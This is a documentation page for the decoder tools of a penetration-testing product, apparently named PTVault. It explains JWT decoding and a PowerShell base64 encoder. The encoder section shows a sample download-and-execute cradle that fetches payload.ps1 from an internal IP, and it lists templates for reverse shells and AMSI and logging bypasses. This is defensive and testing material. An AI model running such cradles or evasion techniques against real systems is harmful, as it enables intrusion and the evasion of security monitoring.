# Decoders

The Decoders sub-tab includes two tools for analyzing authentication tokens and PowerShell commands.

## JWT Decoder

JSON Web Tokens (JWTs) are widely used for authentication in modern web applications. The JWT Decoder parses a token's structure and displays its contents without requiring a signature key.

### Accessing

Click **Tools** → **Decoders** → **JWT Decoder**.

### How to Use

1. Paste the JWT token into the input field
2. The decoder automatically splits it into three parts:

| Part | Encoded Format | Content |
|------|---------------|---------|
| **Header** | Base64URL | Algorithm and token type |
| **Payload** | Base64URL | Claims and user data |
| **Signature** | Binary | Signature (not decoded — requires the secret) |

### Header Information

The decoded header typically shows:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Common algorithms: `HS256`, `HS512`, `RS256`, `RS512`, `ES256`

### Payload Information

The payload contains the token's claims:

| Claim | Description |
|-------|-------------|
| `sub` | Subject (user identifier) |
| `iat` | Issued At (Unix timestamp) |
| `exp` | Expiration time (Unix timestamp) |
| `aud` | Audience |
| `iss` | Issuer |
| Custom claims | Application-specific fields |

PTVault displays `iat` and `exp` as human-readable dates alongside the Unix timestamps.

### Security Note

The JWT Decoder only **decodes** the token — it does not verify the signature. The token's claims cannot be trusted without signature verification. For penetration testing, decoded payloads can reveal:
- User roles and permissions embedded in tokens
- Expiration times (useful for session hijacking assessments)
- Application-specific claims that may be manipulated

---

## PowerShell Encoder

Encode PowerShell commands to the base64 format used with `powershell -EncodedCommand`, or decode existing encoded commands back to plaintext.

### Accessing

Click **Tools** → **Decoders** → **PowerShell Encoder**.

### Encoding Mode

1. Select **Encode**
2. Type or paste your PowerShell command
3. The encoded command appears automatically
4. Copy the full command with the `powershell -EncodedCommand <encoded>` wrapper

**Example:**

Input:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.10/payload.ps1')
```

Output:
```
powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIA...
```

### Decoding Mode

1. Select **Decode**
2. Paste the base64-encoded string (with or without the `powershell -EncodedCommand` prefix)
3. The decoded plaintext PowerShell command appears

### Character Encoding

PowerShell's `-EncodedCommand` uses **UTF-16LE** (little-endian Unicode) encoding, then base64. PTVault handles this encoding correctly, matching PowerShell's native behavior.

### Built-In Templates

Common PowerShell patterns are available as templates to help you get started quickly:
- Download and execute
- Reverse shell
- AMSI bypass
- Script block logging bypass

Click a template to load it into the encode field, then modify as needed.

### Use Cases

- Generate encoded commands for evasion during testing
- Analyze obfuscated PowerShell found on a compromised system
- Decode base64 PowerShell in malware samples
- Create compact delivery commands for payloads
